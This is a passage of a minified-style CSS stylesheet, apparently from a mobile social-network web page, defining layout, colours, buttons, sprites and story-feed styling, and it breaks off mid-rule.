        .touch ._2hd9 ._2hda ._2hdf ._1upc {
            background-color: transparent
        }

        .touch ._2hd9 ._2hda ._2hdf::before {
            border: none;
            bottom: 0;
            box-sizing: border-box;
            left: 0;
            right: 0;
            top: 0
        }

        .touch ._2hd9 ._2hdf>div>input {
            margin-bottom: 8px
        }

        .touch ._2hd9 ._2hdf>div input {
            border-radius: 4px
        }

        .touch ._2hd9 ._2hdg {
            background: #0084ff;
            border: 1px solid #0084ff;
            border-radius: 4px;
            box-shadow: none;
            color: #fff;
            font-family: "Helvetica Neue", "Helvetica", "Arial", sans-serif;
            font-size: 14px;
            font-weight: 400;
            text-shadow: none
        }

        .touch ._2hd9 ._2hdg::before {
            background-color: #0084ff;
            background-image: none
        }

        .touch ._2hd9 ._2hdg::after {
            border: none
        }

        .touch ._2hd9 ._5bzu ._2hdg {
            background: #4267b2;
            border: none
        }

        .touch ._2hd9 ._5bzu ._2hdg::before {
            background-color: #4267b2
        }

        .touch ._29ut,
        .touch ._29ut ._4-4l,
        .touch ._29ut ._2hda,
        .touch ._29ut ._2hda._5bzu {
            background-color: #fff
        }

        .touch ._2hda ._66_n {
            color: #1479fb
        }

        ._29ut ._29u- {
            color: #000
        }

        .touch ._2hda a {
            color: #000
        }

        .touch ._27z2 {
            line-height: 20px
        }

        ._27z2 {
            box-sizing: border-box;
            width: 100%
        }

        ._8qtm {
            background: #f5f6f7
        }

        ._1upc {
            background-color: #f5f6f7
        }

        ._3npi {
            border: solid 1px #999
        }

        .touch ._216i a {
            border-radius: 4px;
            color: #3578e5;
            font-weight: 700;
            padding: 4px
        }

        .touch ._216i a:active {
            color: #4773cc
        }

        html ._pg8._pg8 {
            border: 1px solid #fa3e3e
        }

        html ._pg8 ._3qsy {
            border: none
        }

        .touch ._pg8 {
            border-radius: 0 0 4px 4px
        }

        ._98tr {
            z-index: 2
        }

        ._98si {
            color: #1c1e21;
            display: inline-flex;
            font-family: 'Roboto-Medium';
            font-size: 15px;
            font-weight: 700;
            line-height: 36px;
            margin-left: 6px;
            margin-right: 0;
            opacity: 0;
            overflow: hidden;
            white-space: nowrap;
            width: 0
        }

        ._9or- {
            color: #1c1e21;
            display: inline-flex;
            font-family: 'Roboto-Medium';
            font-size: 15px;
            font-weight: 700;
            line-height: 36px;
            margin-left: 6px;
            margin-right: -6px;
            opacity: 0;
            overflow: hidden;
            white-space: nowrap;
            width: 0
        }

        ._98sk {
            color: #1877f2
        }

        ._9lhd {
            display: flex;
            flex-direction: row;
            height: 12px;
            justify-content: flex-end;
            margin-top: -2px
        }

        ._9lh8 {
            border-radius: 18px;
            line-height: 36px;
            padding: 0 10px;
            text-align: center
        }

        ._9lh9 {
            margin-top: 10px
        }

        ._98tu {
            background-color: #f0f2f5
        }

        ._98ty {
            background-color: #e7f3ff
        }

        ._9lha {
            border-radius: 18px;
            height: 36px;
            padding: 0 4px;
            text-align: center
        }

        ._9lh7 {
            margin-bottom: -3px;
            margin-left: 6px
        }

        ._9lhe {
            margin-left: 6px;
            margin-top: 10px
        }

        ._9p7l {
            position: absolute;
            z-index: 2
        }

        ._9p81 {
            left: 50%;
            margin-top: 12px;
            transform: translate(-50%, -50%)
        }

        ._9p7o {
            margin-top: -78px
        }

        ._96qv {
            margin: 4px 10px;
            padding: 2px;
            text-align: center;
            word-break: break-word
        }

        ._96qw {
            display: inline-block;
            font-size: 10px;
            line-height: 13px;
            margin: 2px 3px;
            padding: 0 2px;
            position: relative;
            top: -2px;
            white-space: nowrap;
            word-break: keep-all
        }

        ._9a0a ._96qw {
            margin: 2px 0;
            padding: 0 1px
        }

        .touch ._96qv ._96qw {
            color: #8a8d91
        }

        .touch ._96qv ._96qw._97hz {
            color: #bcc0c4
        }

        .grouped {
            padding: 8px 0
        }

        .grouped>.area {
            border-left-style: solid;
            border-left-width: 1px;
            border-right-style: solid;
            border-right-width: 1px;
            margin: 0 8px
        }

        .grouped .first {
            background-clip: padding-box;
            border-top-left-radius: 8px;
            border-top-right-radius: 8px;
            border-top-style: solid;
            border-top-width: 1px
        }

        .grouped .last {
            background-clip: padding-box;
            border-bottom-left-radius: 8px;
            border-bottom-right-radius: 8px;
            border-bottom-style: solid;
            border-bottom-width: 1px
        }

        .touch .grouped .al {
            background: none;
            border: 0;
            height: auto;
            margin: 0;
            padding-bottom: 8px;
            padding-left: 17px
        }

        .touch .grouped.inset>.acw {
            border-color: rgba(0, 0, 0, .185)
        }

        .touch .grouped.inset>.first {
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .1)
        }

        .touch .grouped.inset>.last {
            box-shadow: 0 1px 0 rgba(255, 255, 255, .8)
        }

        .touch .grouped.inset>.first.last {
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .1), 0 1px 0 rgba(255, 255, 255, .8)
        }

        .touch .grouped.inset .textInputAreaLabel.apl {
            padding-left: 11px;
            padding-right: 11px
        }

        .touch .grouped.inset .textInputArea .tiapl {
            padding: 12px 11px 13px
        }

        .touch .touchableArea {
            align-items: center;
            display: block;
            display: flex;
            min-height: 27px
        }

        .touch.ff .touchableArea {
            display: block
        }

        .touch .touchableArea.centered {
            justify-content: center
        }

        .touch .touchableArea.touched {
            background: #627aad;
            color: #fff
        }

        .ios.app .touchableArea.touched {
            background: linear-gradient(#058cf5 0%, #015de6 70%)
        }

        .touch .touchableArea.hasArrow {
            padding-right: 26px;
            position: relative
        }

        .touch .touchableArea.hasArrow .arrow {
            margin-top: -6px;
            position: absolute;
            right: 8px;
            top: 50%
        }

        .touch .btnBar {
            margin: 0;
            width: 100%;
            border-collapse: collapse;
            table-layout: fixed
        }

        .touch .btnBar .btn {
            border-radius: 3px;
            display: block;
            width: 100%
        }

        .touch .btnBar td {
            padding: 0 3px 0 2px
        }

        .touch .btnBar td:first-child {
            padding-left: 0
        }

        .touch .btnBar td:last-child {
            padding-right: 0
        }

        ._4nyr {
            background: #fafafa;
            border: 1px solid #9cb4d8;
            box-sizing: border-box;
            display: block;
            padding: 3px;
            width: 100%
        }

        ._4nyr._4qkw,
        .touch ._8y5b ._4nyr._4qkw {
            border: 1px solid #fa3e3e
        }

        ._5yc_ {
            background: #3578e5
        }

        ._5yd0 {
            background: #fa3e3e
        }

        ._5yd1 {
            color: #fff
        }

        .touch ._5yd1 a,
        .touch ._5yd1 a:visited {
            color: #fff;
            font-weight: 700
        }

        ._du6._du6 {
            background-color: #b9cad2;
            border-top: 0;
            color: #4b4f56
        }

        ._du7 {
            margin: 0 auto;
            max-width: 750px
        }

        ._du8 {
            color: #1d2129;
            font-size: 16px;
            margin-bottom: 4px
        }

        ._du6 ._duc._duc {
            font-size: 14px;
            padding: 12px
        }

        ._dui {
            background-image: url(/rsrc.php/v3/yc/r/hrb0H7k9FkC.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -1057px;
            float: right;
            height: 150px;
            width: 300px
        }

        ._du6.mac ._dui {
            background-image: url(/rsrc.php/v3/yc/r/hrb0H7k9FkC.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -302px
        }

        ._du6.mac.chrome ._dui {
            background-image: url(/rsrc.php/v3/yc/r/hrb0H7k9FkC.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 0
        }

        ._du6.mac.firefox ._dui {
            background-image: url(/rsrc.php/v3/yc/r/hrb0H7k9FkC.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -151px
        }

        ._du6.mac.safari ._dui {
            background-image: url(/rsrc.php/v3/yc/r/hrb0H7k9FkC.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -453px
        }

        ._du6.windows.chrome ._dui {
            background-image: url(/rsrc.php/v3/yc/r/hrb0H7k9FkC.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -604px
        }

        ._du6.windows.firefox ._dui {
            background-image: url(/rsrc.php/v3/yc/r/hrb0H7k9FkC.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -906px
        }

        ._du6.windows.edge ._dui,
        ._du6.windows.ie ._dui {
            background-image: url(/rsrc.php/v3/yc/r/hrb0H7k9FkC.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -755px
        }

        ._80q1 {
            font-size: 12px;
            line-height: 14px
        }

        ._7_v5 {
            background-color: #e6f2ff;
            border-bottom: 1px solid #6eadff
        }

        ._7_v6 {
            background-color: #e6f2ff;
            color: #444950;
            font-size: 12px;
            line-height: 14px;
            padding: 10px 12px
        }

        .sp_9G58P42hkTn {
            background-image: url(/rsrc.php/v3/yq/r/0AExJ9-fa2d.png);
            background-size: auto;
            background-repeat: no-repeat;
            display: inline-block;
            height: 24px;
            width: 24px
        }

        .sp_9G58P42hkTn.sx_5dc4d5 {
            width: 16px;
            height: 16px;
            background-position: 0 -75px
        }

        .sp_9G58P42hkTn.sx_38483a {
            width: 16px;
            height: 16px;
            background-position: 0 -92px
        }

        .sp_9G58P42hkTn.sx_fc47c8 {
            background-position: 0 0
        }

        .sp_9G58P42hkTn.sx_22ac2c {
            background-position: 0 -25px
        }

        .sp_9G58P42hkTn.sx_586700 {
            background-position: 0 -50px
        }

        .sp_9G58P42hkTn.sx_d4c693 {
            width: 12px;
            height: 12px;
            background-position: 0 -109px
        }

        .sp_mba4nweFXif {
            background-image: url(/rsrc.php/v3/yc/r/hrb0H7k9FkC.png);
            background-size: auto;
            background-repeat: no-repeat;
            display: inline-block;
            height: 150px;
            width: 300px
        }

        .sp_mba4nweFXif.sx_d23089 {
            background-position: 0 0
        }

        .sp_mba4nweFXif.sx_5f8d1f {
            background-position: 0 -151px
        }

        .sp_mba4nweFXif.sx_4416e0 {
            background-position: 0 -302px
        }

        .sp_mba4nweFXif.sx_716ff5 {
            background-position: 0 -453px
        }

        .sp_mba4nweFXif.sx_f534c9 {
            background-position: 0 -604px
        }

        .sp_mba4nweFXif.sx_3b1df8 {
            background-position: 0 -755px
        }

        .sp_mba4nweFXif.sx_792797 {
            background-position: 0 -906px
        }

        .sp_mba4nweFXif.sx_dcc4d4 {
            background-position: 0 -1057px
        }

        .sp_xm9DDmY7HAL {
            background-image: url(/rsrc.php/v3/yj/r/EDFsehamV8T.png);
            background-size: auto;
            background-repeat: no-repeat;
            display: inline-block;
            height: 16px;
            width: 16px
        }

        .sp_xm9DDmY7HAL.sx_427177 {
            background-position: 0 -33px
        }

        .sp_xm9DDmY7HAL.sx_9331ed {
            background-position: 0 -50px
        }

        .sp_xm9DDmY7HAL.sx_9c1f22 {
            width: 18px;
            height: 32px;
            background-position: 0 0
        }

        #bootloader_f_Dxujg {
            height: 42px
        }

        .bootloader_f_Dxujg {
            display: block !important
        }

        ._2g0e {
            margin-left: 10px
        }

        ._1-gi {
            display: inline-block;
            line-height: 16px;
            margin-right: 4px
        }

        ._1-gi.invisible_elem {
            visibility: hidden
        }

        ._1e_c {
            border-radius: 2px;
            vertical-align: middle
        }

        ._jvo._jvo {
            vertical-align: middle
        }

        ._ru1 {
            padding: 12px 0;
            text-align: center
        }

        ._ru0:first-child {
            border-top: none
        }

        ._ru0 {
            border-top: 1px solid #e5e5e5;
            line-height: 32px;
            padding: 8px
        }

        ._3nv2 {
            float: right;
            padding: 12px;
            padding-left: 4px
        }

        .fbEmuTracking {
            position: absolute;
            visibility: hidden
        }

        ._513c #viewport {
            margin: 0 auto;
            max-width: 600px
        }

        ._7hj_ {
            visibility: hidden
        }

        ._6ykc {
            padding-left: 5px
        }

        ._6ykd {
            padding-right: 5px
        }

        ._7gvg {
            font-weight: 700;
            margin-left: -50px
        }

        ._6-xu {
            height: 30px;
            width: 100%
        }

        .touch ._b7l {
            margin: 10px
        }

        .touch ._69aj {
            background: #fff;
            border-bottom: 1px solid #dadde1;
            border-top: 1px solid #dadde1;
            height: 105px;
            line-height: 105px;
            margin: 8px 0;
            padding: 0;
            vertical-align: middle
        }

        .touch ._69aj .img {
            vertical-align: middle
        }

        .touch ._7f7_ {
            background: #fff;
            border-top: 1px solid #dadde1;
            height: 60px;
            line-height: 60px;
            margin: 0 0 8px;
            padding: 0;
            vertical-align: middle
        }

        .touch ._7f7_ .img {
            vertical-align: middle
        }

        .touch ._b7l._5o14 {
            margin: 0 0 8px;
            position: relative
        }

        .touch ._400s {
            border-bottom: 1px solid #bec3c9
        }

        .touch ._54o7 {
            display: none;
            opacity: 0
        }

        .touch ._3sa4 {
            opacity: 1;
            transition: opacity 1s ease-in-out
        }

        .touch ._5v82 {
            display: block
        }

        ._4nbo {
            align-items: center;
            background-color: #000;
            bottom: 0;
            display: flex;
            justify-content: center;
            left: 0;
            pointer-events: none;
            position: fixed;
            right: 0;
            top: 0;
            z-index: 5
        }

        ._4nbo.hidden_elem {
            display: none
        }

        ._4nbo.full_loading_screen {
            z-index: 13
        }

        ._4rey {
            overflow: hidden
        }

        ._5gh8::after {
            border-bottom: 1px solid transparent;
            content: '';
            display: block;
            margin-top: -1px
        }

        .touch ._55wr._4uhd {
            padding: 8px 8px 16px
        }

        ._5gh8 ._7ab_,
        ._5gh8 ._7ac0 {
            margin: 0 -10px
        }

        ._4zol {
            box-shadow: 3px 0 3px #b1b1b1;
            margin-bottom: 6px;
            position: relative
        }

        ._4zom,
        ._5fju,
        ._4z85,
        ._4z86,
        ._3-2z {
            padding: 8px 0
        }

        ._syn {
            padding: 8px 0;
            position: relative
        }

        ._ed_ {
            border-bottom: 1px solid #bec3c9;
            border-top: 1px solid #ccc;
            position: relative
        }

        ._5fjw>:first-child,
        ._5fjw>div {
            border-bottom: 1px solid #e5e5e5
        }

        ._5fjw>:last-child {
            border-bottom: 0 none
        }

        ._5fjw,
        ._4z83 {
            border-bottom: 1px solid #bec3c9;
            border-top: 1px solid #ccc;
            position: relative
        }

        ._4z84 {
            box-shadow: 0 1px 2px #b1b1b1;
            position: relative
        }

        .touch ._3b9.structuredPublisher .btnBarLinked td:first-child .btn,
        .touch ._3b9.structuredPublisher .btnBarLinked td:last-child .btn {
            border-radius: 0
        }

        ._3-2- {
            border-bottom: 1px solid #ccc;
            border-top: 1px solid #ccc;
            position: relative
        }

        .touch .apm._2xkb {
            padding: 5px 0
        }

        ._2xkd {
            border-bottom: 1px solid #bec3c9;
            border-top: 1px solid #ccc
        }

        ._2xkd>:first-child,
        ._2xkd>div {
            border-bottom: 1px solid #e5e5e5
        }

        ._2xkd>:last-child {
            border-bottom: 0 none
        }

        .touch ._2xkd ._2xke {
            padding: 12px 0
        }

        ._3on5 {
            margin: 0 0 10px
        }

        ._3on6 {
            border-bottom: 1px solid #bec3c9;
            border-top: 1px solid #ccc
        }

        ._3on7 {
            padding: 12px 0
        }

        ._5uso .ai {
            display: inline-block;
            margin-right: 3px;
            vertical-align: top
        }

        ._5uso .ai.ail {
            margin-right: 0
        }

        ._5uso .ai .img {
            background: #eceff5
        }

        ._5uso .ai.inline {
            margin-right: 5px
        }

        ._5uso .ai.newline {
            display: block;
            margin-bottom: 5px
        }

        ._5uso .img {
            box-shadow: 0 1px 3px 0 rgba(0, 0, 0, .4)
        }

        ._5pes ._5uso {
            background: #000;
            margin-left: -10px;
            margin-right: -10px
        }

        ._yff {
            position: relative
        }

        ._yff .img {
            vertical-align: middle
        }

        ._yff a,
        ._yff div {
            display: block;
            height: 100%;
            left: -10px;
            padding: 10px;
            position: absolute;
            top: -10px;
            width: 100%
        }

        ._5m7r ._5c0f {
            min-height: 44px;
            text-align: center
        }

        ._5m7r ._5c0f:before {
            content: '';
            display: inline-block;
            height: 44px;
            vertical-align: middle;
            width: 0
        }

        ._5m7t {
            display: inline-block;
            vertical-align: middle
        }

        ._5rgr {
            margin: 0 10px 15px;
            position: relative;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            word-wrap: break-word
        }

        ._5gh8._5rgr {
            margin: 0 0 8px
        }

        ._3f50>._5rgr {
            margin: 0
        }

        .embedded>._5rgr {
            margin: 10px
        }

        .messageAttachments>._5rgr {
            margin: 0
        }

        ._67i4 .messageAttachments>._5rgr {
            margin-bottom: 2px
        }

        ._67i4 .messageAttachments>._5rgr {
            overflow: visible
        }

        ._5rgr ._5rgr {
            border-top: 1px solid rgba(0, 0, 0, .07);
            margin: 0
        }

        ._5rgr ._5rgr._5ysf {
            border-top: 0
        }

        ._3f_b ._5rgu {
            position: relative;
            z-index: 12
        }

        ._9d_2 {
            position: relative;
            z-index: 9
        }

        ._5rgr ._4hkg {
            margin: 0 10px 10px
        }

        ._37w7 ._5rgr,
        ._5rgr ._5s1m {
            margin: 0
        }

        ._37w7 ._5rgr::before {
            border-style: none
        }

        ._6gzm ._5rgr {
            margin: 0
        }

        ._5rgs._5rgs a {
            color: #1d2129
        }

        ._5rgs._5jk3 {
            color: #1d2129;
            font-weight: 400
        }

        ._5rgs {
            border-bottom: 1px solid rgba(0, 0, 0, .1);
            color: #999;
            font-size: 13px;
            line-height: 17px;
            padding: 8px 10px
        }

        ._5rgt,
        ._5rgu._6ocu {
            padding-bottom: 10px
        }

        ._5rgt,
        ._5rgu {
            padding: 0 10px
        }

        ._5rgu._6tbh {
            margin: 4px 0;
            padding: 0
        }

        ._6q6_._5rgu {
            position: relative
        }

        ._3eka._5rgu {
            position: relative
        }

        ._5pes {
            margin-bottom: -10px
        }

        ._u1r ._27x0 {
            margin-bottom: -10px
        }

        ._5rgt,
        ._5t8z {
            margin: 8px 0
        }

        ._5rgt p,
        ._5t8z p {
            margin-bottom: 6px
        }

        ._5rgt p:last-child,
        ._5t8z p:last-child {
            margin-bottom: 0
        }

        ._5t8z {
            display: block
        }

        ._5pes ._5t8z {
            margin-top: 0
        }

        ._5rgt a,
        .touch .storyStream ._5rgr ._5rgt a {
            color: #576b95;
            font-weight: 400
        }

        ._37w7 ._5rgt {
            height: 68px
        }

        .touch ._37w7 ._5rgt {
            height: auto
        }

        ._37w7 ._x0v ._5rgt {
            height: 100%
        }

        ._37w7 ._x0v ._5rgu {
            padding: 0
        }

        ._5rgt {
            position: relative
        }

        ._4vbp {
            color: #7f7f7f;
            font-family: 'HelveticaNeue-Medium', 'Helvetica Neue Medium', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            font-size: 14px;
            margin: 15px 0 9px
        }

        ._5msi a,
        ._5msi button,
        ._5msi div[data-sigil*="more"] {
            position: relative;
            z-index: 1
        }

        ._5msi a._5msj {
            bottom: 0;
            left: 0;
            position: absolute;
            right: 0;
            top: 0;
            z-index: 0
        }

        ._4hkg ._4hkg ._4hkg .widePic {
            margin-left: -35px;
            margin-right: -35px
        }

        ._4hkg ._4hkg .widePic {
            margin-left: -25px;
            margin-right: -25px
        }

        ._4hkg .widePic {
            margin-left: -15px;
            margin-right: -15px
        }

        ._5rgr ._1p6- {
            background: #f5f6f7;
            border-top: 1px #dadde1 solid;
            color: #5e5e5e;
            font-size: 12px;
            font-weight: 700;
            line-height: 36px;
            text-align: center
        }

        ._5rgr ._1p6-::before {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -210px;
            content: '';
            display: inline-block;
            height: 20px;
            margin: 0 4px 4px 0;
            vertical-align: middle;
            width: 20px
        }

        ._2z05 {
            padding: 20px 40px
        }

        ._21nd {
            padding: 0 0 10px
        }

        ._21nd ._5t8z {
            margin: 8px 8px 0
        }

        ._kw0 {
            margin-left: -10px;
            margin-right: -10px
        }

        ._3zhw {
            background-color: #edf2fa;
            border-bottom: solid 1px #dddfe2;
            border-top: solid 1px #dddfe2;
            padding: 8px 10px
        }

        ._3zhx {
            color: #5e5e5e;
            font-size: 12px;
            font-weight: 700
        }

        ._3zhy {
            color: #5e5e5e;
            font-size: 12px
        }

        ._3zi1 {
            margin-left: 8px
        }

        ._612d {
            background-color: rgba(255, 255, 255, .8);
            bottom: 0;
            left: 0;
            position: absolute;
            right: 0;
            top: 0;
            z-index: 0
        }

        ._6p6p {
            height: 50px
        }

        ._6tfp ._6p6p {
            background-color: #f2f3f5
        }

        ._6tfr ._6p6p {
            background-color: #fff
        }

        ._6p6q {
            height: 200px;
            margin: 0;
            overflow: hidden;
            padding: 0;
            width: 100%
        }

        ._6p6q ._5s1m {
            margin: 0
        }

        ._6p6q div {
            margin: 0
        }

        ._4vbo {
            background-color: #000;
            border-bottom: 1px solid rgba(255, 255, 255, .15);
            margin: 0 0 8px
        }

        ._1sme {
            margin-left: 0;
            margin-right: 0
        }

        ._4vbo ._5rgs {
            color: #7f7f7f
        }

        ._4vbo ._yff {
            opacity: .7
        }

        ._3q6s {
            border-left: 1px solid #ccd0d5;
            margin: 10px
        }

        ._3q6s::after {
            clear: both;
            content: ".";
            display: block;
            font-size: 0;
            height: 0;
            line-height: 0;
            visibility: hidden
        }

        ._3q6s>:last-child:not(:only-child) {
            margin-top: -.2857em;
            position: relative;
            top: .2857em
        }

        ._1mft {
            float: right
        }

        ._1mfu {
            margin-top: 0 !important;
            padding-top: 0 !important
        }

        ._3q6u::before {
            border-radius: 0
        }

        .ios ._3q6u::before {
            background-image: none
        }

        .ios ._3q6u::before {
            border-image: url(/rsrc.php/v3/yQ/r/pmiVSByLqAj.png) 6 6 8 6 repeat
        }

        .ios.x2 ._3q6u::before {
            border-image: url(/rsrc.php/v3/yU/r/tmh54jYX4fa.png) 12 12 16 12 repeat
        }

        ._77lh {
            margin-bottom: 10px
        }

        ._3q6u ._77lh {
            margin-top: -9px
        }

        ._3q6u ._3q6w {
            margin-bottom: -9px
        }

        ._4gbt ._4gbu {
            display: block
        }

        ._lt3._lt3 {
            display: block;
            margin: 0 auto
        }

        ._4gbt ._1xvv .img {
            display: inline-block
        }

        ._4gbv {
            padding-top: 12px
        }

        .touch .scrollAreaBody ._3iuw {
            border-bottom: 1px solid #eee;
            margin: 0;
            padding: 10px
        }

        ._24u0 {
            color: #90949c
        }

        ._24u1 {
            color: #4b4f56
        }

        ._312n {
            color: #1d2129
        }

        ._2xim {
            font-size: 14px;
            line-height: 18px
        }

        ._vk- {
            background: #42b72a;
            border: 2px solid #fff;
            border-radius: 9px;
            bottom: -2px;
            height: 9px;
            position: absolute;
            right: -2px;
            width: 9px
        }

        ._4v5- {
            height: 0;
            margin-top: -10px
        }

        .touch ._w_y,
        .touch ._4ob2 ._w_- {
            display: none
        }

        .touch ._4ob2 ._w_y {
            display: block
        }

        ._6-4e {
            background-color: #fff;
            margin-bottom: 8px;
            width: 100%
        }

        ._6-4f {
            border-bottom: 1px solid #dadde1;
            color: #444950;
            font-size: 14px;
            font-weight: 700;
            line-height: 17px;
            padding-bottom: 10px;
            padding-left: 10px;
            padding-top: 10px
        }

        ._9a63 {
            color: #1c1e21;
            font-size: 16px;
            font-weight: 700;
            line-height: 17px;
            padding-left: 12px;
            padding-top: 16px
        }

        ._79u_ {
            border-top: 1px solid #dadde1
        }

        .ib .l._6-4g {
            margin-right: 8px
        }

        ._3-rj {
            text-align: center
        }

        ._3-rk {
            background-color: #f5f6f7;
            padding-bottom: 18px;
            padding-top: 18px
        }

        ._3-rl {
            align-items: center;
            color: #1d2129;
            font-size: 16px;
            line-height: 20px;
            margin-bottom: 15px;
            text-align: center
        }

        .touch ._4n41 {
            border-bottom: 1px solid #ccd0d5
        }

        ._3-rm {
            margin-bottom: 5px;
            width: 100%
        }

        ._4n42 {
            padding-left: 5%;
            padding-right: 5%
        }

        .touch ._4n41 ._4n43 {
            border: none;
            box-shadow: none;
            font-size: 14px;
            font-weight: 400;
            margin-bottom: 5px;
            text-shadow: none;
            width: 100%
        }

        ._3-rn {
            margin-top: 5px;
            width: 50%
        }

        .touch ._4n41 ._4n44 {
            border: none;
            box-shadow: none;
            font-size: 14px;
            font-weight: 400;
            margin-top: 5px;
            min-width: 50%;
            padding: 0 12px;
            text-shadow: none
        }

        ._4n45 {
            font-size: 18px;
            font-weight: 700
        }

        ._4n47 {
            font-size: 15px;
            margin-top: 2px
        }

        .touch ._4n41 ._6gg6::before {
            background-color: #1877f2;
            background-image: none
        }

        .touch ._4n41 ._6gg6._901w.touched::before {
            background: #6eadff
        }

        .touch ._4n41 ._6gg7::before {
            background-color: #00a400;
            background-image: none
        }

        .touch ._4n41 ._6gg7._901x.touched::before {
            background-color: #86df81
        }

        .touch ._4n41 ._6gg6::after,
        .touch ._4n41 ._6gg7::after {
            border-image: none;
            border-width: 0
        }

        ._8q11 {
            padding-right: 12px
        }

        ._8q13 {
            text-align: left
        }

        ._1m6a {
            height: 20px
        }

        ._1m6b {
            border-bottom: 1px solid #ccd0d5;
            height: 10px;
            text-align: center;
            width: 100%
        }

        ._1m6d {
            color: #4b4f56;
            font-size: 12px;
            line-height: 20px;
            padding: 0 10px
        }

        ._3bc8 {
            background-color: #fff
        }

        ._3bc9 {
            background-color: #f5f6f7
        }

        ._5aw4 {
            color: #6d84b4
        }

        ._x7l {
            border-left: 2px solid #dcdee3;
            margin: 6px 0 0;
            padding-left: 9px
        }

        ._48ky {
            color: #90949c
        }

        ._x7p {
            margin-top: 5px;
            text-align: left
        }

        ._1ze2 {
            color: #90949c
        }

        ._3nc8 {
            direction: ltr
        }

        ._3nc7 {
            direction: rtl
        }

        ._1ss6 {
            border-left: 2px solid #dcdee3;
            margin: 6px 0 0
        }

        ._4cc5 {
            padding-left: 9px
        }

        ._2a_i ._x7p {
            font-size: 12px;
            line-height: 14px;
            padding-left: 12px
        }

        ._2a_i ._x7l {
            margin-bottom: 6px;
            margin-top: 0
        }

        ._1_if {
            margin-top: 3px
        }

        ._1_ig {
            color: #365899
        }

        ._4cuo {
            text-align: center
        }

        .touch ._98fb {
            margin-top: 5px
        }

        .touch ._98fc {
            background: #fff;
            height: 44px
        }

        .touch ._98d5 {
            width: 112px
        }

        .touch ._98d6 {
            background: #fff;
            margin-top: 4px;
            text-align: center
        }

        .touch ._98d7 {
            background-color: #E4E6EB !important
        }

        ._5wnf {
            text-align: right
        }

        ._5wng {
            text-align: left
        }

        ._qdx {
            direction: ltr;
            unicode-bidi: isolate
        }

        ._qdy {
            direction: rtl;
            unicode-bidi: isolate
        }

        ._qdz {
            unicode-bidi: isolate
        }

        .touch ._8piw {
            width: 100vw
        }

        .touch ._8piw._8phm {
            display: flex;
            flex-direction: column
        }

        .touch ._8phm ._8q6p {
            flex: 1;
            overflow-y: scroll;
            padding-bottom: 62px;
            width: 100%
        }

        .touch ._8piw ._8q6p._8uoa {
            bottom: 0;
            position: absolute;
            width: 100%
        }

        .touch ._8phl ._8q6p {
            padding-bottom: 62px
        }

        .touch ._8phm ._8q6p._8rrl,
        .touch ._8phl ._8q6p._8rrl {
            padding-bottom: calc(62px + 201px)
        }

        .touch ._8phm ._8q6p._8rrm,
        .touch ._8phl ._8q6p._8rrm {
            padding-bottom: calc(62px + 105px)
        }

        .touch ._8phl._8sbx ._8q6p {
            padding-bottom: 86px
        }

        .touch ._8phl._8sbx ._8q6p._8rrl {
            padding-bottom: calc(86px + 201px)
        }

        .touch ._8phl._8sbx ._8q6p._8rrm {
            padding-bottom: calc(86px + 105px)
        }

        .touch ._8phl ._8rrp,
        .touch ._8phm ._8rrp {
            background-color: #fff;
            bottom: 0;
            position: fixed;
            width: 100%
        }

        .touch ._8piw ._8rwx {
            display: flex;
            justify-content: center;
            opacity: .8;
            position: absolute;
            text-align: center;
            top: 100px;
            width: 100%;
            z-index: 1
        }

        .touch ._8piw._8phl ._8rwx {
            position: fixed
        }

        .touch ._8piw ._8rwr {
            display: none
        }

        .touch ._8piw ._8rwx ._8rws {
            border: none;
            border-radius: 30px;
            font-size: 14px;
            line-height: 18px;
            max-height: 60px;
            padding: 12px
        }

        .touch ._8piv {
            background: #627aad;
            border-bottom: solid 1px #083e89;
            border-top: solid 1px #083e89;
            margin-bottom: -1px;
            margin-top: -1px
        }

        .touch ._8piv a {
            color: #fff
        }

        ._4b-b {
            bottom: 0;
            height: 0;
            left: 0;
            position: fixed;
            width: 100%;
            z-index: 400
        }

        ._2cju {
            box-shadow: 0 -3px 3px 0 rgba(0, 0, 0, .12), 0 -4px 8px 0 rgba(0, 0, 0, .08)
        }

        ._4b-n {
            float: right;
            margin-right: 10px;
            margin-top: 10px
        }

        ._3drp ._3drq {
            margin: 0
        }

        ._3drp {
            position: relative
        }

        ._3drp ._4q4l {
            position: absolute;
            right: 36px;
            top: -4px;
            z-index: 100
        }

        ._721v {
            background-color: #fff;
            padding: 0 12px
        }

        ._721v ._721w {
            background-color: #ccd0d5;
            height: 1px
        }

        ._721w {
            height: 1px
        }

        ._8gq6 {
            background-color: #000;
            height: 100%;
            position: fixed;
            width: 100%
        }

        ._8gq6:before {
            content: '';
            display: inline-block;
            height: 100%;
            vertical-align: middle
        }

        ._8gpu {
            display: inline-block;
            vertical-align: middle;
            width: 100%
        }

        ._8gq5 {
            background-color: rgba(0, 0, 0, .5);
            bottom: 0;
            color: #fff;
            position: absolute;
            width: 100%
        }

        .touch ._8gq9 a {
            color: #fff;
            font-weight: 700
        }

        ._8gq9 {
            font-size: 13px;
            line-height: 20px;
            margin: 10px
        }

        ._8gqa {
            font-size: 12px;
            line-height: 20px;
            opacity: .6
        }

        ._8gqc {
            display: flex;
            flex-direction: row;
            justify-content: flex-end
        }

        ._8gqd {
            background-color: rgba(0, 0, 0, .5);
            display: inline-block;
            position: absolute;
            width: 100%;
            z-index: 11
        }

        ._8gqe {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -25px -143px;
            height: 25px;
            margin-top: 10px;
            width: 25px
        }

        ._8gqf {
            display: inline-block;
            height: 100%;
            width: 100%
        }

        ._8huh {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -72px -110px;
            height: 25px;
            margin-left: 10px;
